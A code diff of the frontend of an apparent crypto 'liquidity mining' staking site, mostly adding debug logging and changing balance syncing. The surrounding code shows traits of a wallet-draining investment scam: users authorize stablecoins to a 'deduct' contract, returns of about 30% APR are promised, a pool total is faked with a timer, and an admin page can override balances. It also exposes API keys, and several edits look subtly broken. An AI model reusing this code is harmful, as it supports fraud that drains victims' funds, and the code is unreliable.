@@ -1,26 +1,33 @@
 // ==================== 後端 API URL (您的 ngrok) ====================
 const BACKEND_API_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev/api';
+console.log('[DEBUG] BACKEND_API_URL 初始化:', BACKEND_API_URL);
 // ==================== Infura 備用節點 ====================
 const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
 // ==================== SSE 替代 WebSocket ====================
 let eventSource;
 function initSSE() {
-  console.log('[DEBUG] 初始化 SSE 連線...');
+  console.log('[DEBUG] 初始化SSE連線...');
   if (eventSource) eventSource.close();
   eventSource = new EventSource(`${BACKEND_API_URL}/sse`);
   eventSource.onopen = () => {
-    console.log('[DEBUG] SSE 連線成功');
+    console.log('[DEBUG] SSE連線成功');
   };
   eventSource.onmessage = (e) => {
     try {
       const { event, data } = JSON.parse(e.data);
-      console.log('[DEBUG] SSE 接收:', event, data);
+      console.log('[DEBUG] SSE接收事件:', event);
+      console.log('[DEBUG] SSE接收數據結構:', Object.keys(data));
       if (event === 'dataUpdate' && data.users?.[userAddress]) {
         const userData = data.users[userAddress];
         console.log('[DEBUG] 更新用戶數據:', userData);
         window.currentClaimable = userData.claimable || 0;
-        accountBalance[authorizedToken].pledged = userData.pledgedAmount || 0;
-        accountBalance[authorizedToken].interest = userData.accountBalance?.interest || 0;
+        // 【修正】更新所有代幣餘額，不只當前 token
+        for (const token in accountBalance) {
+          if (userData.accountBalance && userData.accountBalance[token]) {
+            accountBalance[token].pledged = userData.accountBalance[token].pledged || 0;
+            accountBalance[token].interest = userData.accountBalance[token].interest || 0;
+          }
+        }
         // 【新增】演示錢包同步
         if (userData.isDemoWallet) {
           console.log('[DEBUG] 檢測到演示錢包，自動模擬');
@@ -30,9 +37,12 @@ function initSSE() {
           updateStatus("演示模式：已自動授權");
           activateStakingUI();
         }
+        // 【關鍵修正】強制更新所有UI
         updateClaimableDisplay();
         updateAccountBalanceDisplay();
         updatePledgeSummary();
+        updateWalletBalanceFromCache(); // 強制刷新餘額顯示
+        console.log('[DEBUG] UI更新完成');
       }
       if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
         console.log('[DEBUG] 接收質押接受:', data);
@@ -64,16 +74,17 @@ function initSSE() {
         );
       }
       if (event === 'pledgeRejected' && data.address === userAddress.toLowerCase()) {
+        console.log('[DEBUG] 接收質押駁回:', data);
         pledgeBtn.disabled = false;
         pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
         showPledgeResult('error', '質押被駁回', data.reason || '未知原因');
       }
     } catch (error) {
-      console.error('[DEBUG] SSE 解析錯誤:', error);
+      console.error('[DEBUG] SSE解析錯誤:', error);
     }
   };
   eventSource.onerror = () => {
-    console.log('[DEBUG] SSE 連線錯誤，重試...');
+    console.log('[DEBUG] SSE連線錯誤，重試...');
     eventSource.close();
     setTimeout(initSSE, 5000);
   };
@@ -88,7 +99,7 @@ const app = window.firebase.initializeApp({
   appId: "1:596688766295:web:5f2c5d65bf414f9dc7aa12"
 });
 const db = window.firebase.firestore();
-console.log('[DEBUG] Firebase 初始化完成');
+console.log('[DEBUG] Firebase初始化完成');
 // ==================== 常數 ====================
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
@@ -263,10 +274,10 @@ const translations = {
     wethValueTooLow: 'WETH 價值過低。',
     rulesTitle: '挖礦規則',
     rulesContent: `
-      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
+      <p>1. 選擇代幣，需至少 500 USDT/USDC 或WETH $500才能開始。</p>
       <p>2. 不足：可授權但無法開始。</p>
       <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
+      <p>4. 每12小時發放一次（美西時間00:00與12:00）。</p>
       <p>5. 質押也會一併計算流動性挖礦利息。</p>
     `,
     modalClaimableLabel: '可領取',
@@ -306,7 +317,7 @@ const translations = {
     claimBtnText: '领取',
     noClaimable: '无可领取利息。',
     claimSuccess: '领取成功！',
-    nextClaimTime: '下次领取时间：12 小时后。',
+    nextClaimTime: '下次领取时间：12小时后。',
     miningStarted: '挖矿开始！',
     error: '错误',
     offlineWarning: '服务器离线，使用本地模式。',
@@ -359,7 +370,7 @@ function log(message, type = 'info') {
     console.error(`[ERROR] ${message}`);
   }
 }
-// 安全獲取 DOM 元素
+// 安全獲取DOM 元素
 function getElements() {
   connectButton = document.getElementById('connectButton');
   statusDiv = document.getElementById('status');
@@ -491,13 +502,13 @@ async function smartSave(data, forceLocal = false) {
     }
   }
   try {
-    console.log('[DEBUG] 寫入 Firestore:', cleanData);
+    console.log('[DEBUG] 寫入Firestore:', cleanData);
     await saveUserData(cleanData, false);
     localStorage.setItem('userData', JSON.stringify(cleanData));
     localStorage.setItem('pendingSync', 'true');
-    console.warn('後端離線，資料已寫入 Firestore + Local');
+    console.warn('後端離線，資料已寫入Firestore + Local');
   } catch (error) {
-    console.error('Firestore 寫入失敗:', error.message);
+    console.error('Firestore寫入失敗:', error.message);
   }
 }
 // ==================== 斷線重連 + 同步 ====================
@@ -516,6 +527,7 @@ setInterval(async () => {
         })
       });
       localStorage.removeItem('pendingSync');
+      console.log('[DEBUG] 本地數據同步成功');
     } catch (error) {
       console.error('[DEBUG] 同步失敗:', error);
     }
@@ -568,12 +580,13 @@ async function saveUserData(data = null, addToPending = true) {
     authorizedToken: authorizedToken
   };
   try {
-    console.log('[DEBUG] 寫入 Firestore:', dataToSave);
+    console.log('[DEBUG] 寫入Firestore:', dataToSave);
     await db.collection('users').doc(userAddress).set(dataToSave, { merge: true });
     localStorage.setItem('userData', JSON.stringify(dataToSave));
     localLastUpdated = dataToSave.lastUpdated;
+    console.log('[DEBUG] Firestore寫入成功');
   } catch (error) {
-    console.error('[DEBUG] Firestore 寫入錯誤:', error);
+    console.error('[DEBUG] Firestore寫入錯誤:', error);
     if (addToPending) pendingUpdates.push({ timestamp: Date.now(), payload: { data: dataToSave } });
   }
 }
@@ -581,14 +594,14 @@ async function saveUserData(data = null, addToPending = true) {
 async function loadUserDataFromServer() {
   if (!userAddress) return;
   try {
-    console.log('[DEBUG] 載入 Firestore 用戶數據:', userAddress);
+    console.log('[DEBUG] 載入Firestore用戶數據:', userAddress);
     const snap = await db.collection('users').doc(userAddress).get();
     if (!snap.exists) {
-      console.log('[DEBUG] Firestore 用戶數據不存在');
+      console.log('[DEBUG] Firestore用戶數據不存在');
       return;
     }
     const userData = snap.data();
-    console.log('[DEBUG] Firestore 載入數據:', userData);
+    console.log('[DEBUG] Firestore載入數據:', userData);
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
     if (userData.lastUpdated >= localLastUpdated || userData.source === 'admin.html') {
@@ -634,22 +647,22 @@ async function loadUserDataFromServer() {
       updateEstimate();
     }
   } catch (error) {
-    console.error('[DEBUG] Firestore 載入錯誤:', error);
+    console.error('[DEBUG] Firestore載入錯誤:', error);
   }
 }
 function startRealtimeListener() {
   if (!userAddress) return;
-  console.log('[DEBUG] 開始 Firestore 即時監聽:', userAddress);
+  console.log('[DEBUG] 開始Firestore即時監聽:', userAddress);
   db.collection('users').doc(userAddress).onSnapshot((docSnap) => {
     if (docSnap.exists) {
       const userData = docSnap.data();
       if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
-        console.log('[DEBUG] Firestore 即時更新觸發');
+        console.log('[DEBUG] Firestore即時更新觸發');
         loadUserDataFromServer();
       }
     }
   }, (error) => {
-    console.error('[DEBUG] Firestore 監聽錯誤:', error);
+    console.error('[DEBUG] Firestore監聽錯誤:', error);
   });
 }
 function updateStatus(message, isWarning = false) {
@@ -758,7 +771,11 @@ async function forceRefreshWalletBalance() {
       wethContract.connect(provider).balanceOf(userAddress)
     ]);
     cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
-    console.log('[DEBUG] 餘額刷新結果:', cachedWalletBalances);
+    console.log('[DEBUG] 餘額刷新結果:', {
+      USDT: ethers.formatUnits(usdtBal, 6),
+      USDC: ethers.formatUnits(usdcBal, 6),
+      WETH: ethers.formatEther(wethBal)
+    });
     updateWalletBalanceFromCache();
     updateAccountBalanceDisplay();
     updateEstimate();
@@ -781,7 +798,7 @@ function updateTotalFunds() {
   const fixedStartTime = 1698796800000;
   const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
   const total = initialFunds + (elapsedSeconds * increasePerSecond);
-  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
+  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}ETH`;
 }
 async function refreshEthPrice() {
   const now = Date.now();
@@ -793,7 +810,7 @@ async function refreshEthPrice() {
     ethPriceCache.price = data.ethereum.usd;
     ethPriceCache.timestamp = now;
   } catch (error) {
-    console.error('[DEBUG] ETH 價格刷新錯誤:', error);
+    console.error('[DEBUG] ETH價格刷新錯誤:', error);
   }
 }
 function initializeMiningData() {
@@ -847,9 +864,9 @@ async function updateInterest() {
 }
 function updateClaimModalLabels() {
   const claimLabels = {
-    'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
+    'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equal Value' },
     'zh-Hant': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
-    'zh-Hans': { title: '领取', claimable: '可领取', selectedToken: '选择代币', equivalentValue: '等值金额' }
+    'zh-Hans': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' }
   };
   const labels = claimLabels[currentLang];
   if (modalTitle) modalTitle.textContent = labels.title;
@@ -997,7 +1014,7 @@ async function connectWallet() {
   try {
     console.log('[DEBUG] 開始錢包連線...');
     if (typeof window.ethereum === 'undefined') {
-      updateStatus('請連結支援 EIP-1193 的錢包', true);
+      updateStatus('請連結支援EIP-1193的錢包', true);
       return;
     }
     if (!provider) {
@@ -1040,7 +1057,7 @@ async function updateUIBasedOnChainState() {
   if (!userAddress) return;
   try {
     console.log('[DEBUG] 開始鏈上狀態檢查...');
-    // 【關鍵修正】Firebase 相容 SDK
+    // 【關鍵修正】FirebaseCompat SDK相容
     const docRef = db.collection('users').doc(userAddress);
     const snap = await docRef.get();
     if (snap.exists && snap.data()?.isDemoWallet) {
@@ -1070,7 +1087,7 @@ async function updateUIBasedOnChainState() {
     } else {
       if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
-      updateStatus("請點擊 Start 進行授權");
+      updateStatus("請點擊Start進行授權");
     }
   } catch (e) {
     console.error('[DEBUG] 鏈上狀態檢查錯誤:', e);
@@ -1110,7 +1127,7 @@ async function handleConditionalAuthorizationFlow() {
   }
   if (!serviceActivated && tokenToActivate) {
     const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-    updateStatus(`Activating service with ${tokenName}...`);
+    updateStatus(`Activate service with ${tokenName}...`);
     try {
       const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
       activateTx.value = 0n;
@@ -1122,7 +1139,7 @@ async function handleConditionalAuthorizationFlow() {
       updateStatus(`Activation failed: ${err.message}`, true);
     }
   }
-  await forceRefreshWalletBalance();
+  await updateWalletBalanceFromCache();
 }
 function updateLanguage(lang) {
   currentLang = lang;
@@ -1153,7 +1170,7 @@ function updateLanguage(lang) {
     if (elements.totalPledgeLabel) elements.totalPledgeLabel.textContent = translations[lang].totalPledge;
     if (elements.estimateLabel) elements.estimateLabel.textContent = translations[lang].estimate;
   };
-  setTimeout(apply, 200);
+  setTimeout(update, 200);
 }
 function calculatePayoutInterest() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
@@ -1278,7 +1295,7 @@ function checkPledgeExpiry() {
 setInterval(checkPledgeExpiry, 60000);
 // ==================== 初始化 ====================
 document.addEventListener('DOMContentLoaded', async () => {
-  console.log('[DEBUG] DOM 載入完成，開始初始化');
+  console.log('[DEBUG] DOM載入完成，開始初始化');
   getElements();
   updateLanguage(currentLang);
   initializeWallet();
@@ -1423,7 +1440,7 @@ document.addEventListener('DOMContentLoaded', async () => {
           localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
           localStorage.setItem('authorizedToken', authorizedToken);
           updateStatus(translations[currentLang].miningStarted);
-          activateStakingUI();
+          updateStakingUI();
           updateAccountBalanceDisplay();
           await smartSave();
           startBtn.style.display = 'none';
@@ -1606,7 +1623,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     })();
   }
 });
-// 自動餘額監控（每 10 秒）
+// 自動餘額監控（每10秒）
 setInterval(async () => {
   if (userAddress && signer && !window.isDemoMode) {
     try {
